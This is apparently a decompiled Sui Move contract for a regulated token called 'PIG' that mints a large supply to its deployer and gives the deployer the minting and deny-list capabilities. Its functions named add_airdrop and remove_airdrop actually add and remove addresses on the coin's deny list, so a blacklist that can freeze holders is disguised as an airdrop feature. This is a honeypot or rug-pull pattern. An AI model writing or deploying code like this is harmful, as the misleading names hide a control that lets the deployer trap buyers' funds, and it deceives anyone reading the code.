module 0x32ffa41415618d68373824b0bdf466955d6c67c753426f93b68e5f1c59e0e061::PIG {
    struct PIG has drop {
        dummy_field: bool,
    }

    public entry fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PIG>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PIG>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: PIG, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PIG>(arg0, 6, b"PIG", b"Sui Pig", b"PIG on Sui", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://cdn.dribbble.com/userupload/8376671/file/original-68fa15a736ab5e436acf4e340424611c.png?resize=1504x1128")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PIG>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<PIG>>(0x2::coin::mint<PIG>(&mut v3, 10000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<PIG>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PIG>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PIG>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<PIG>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

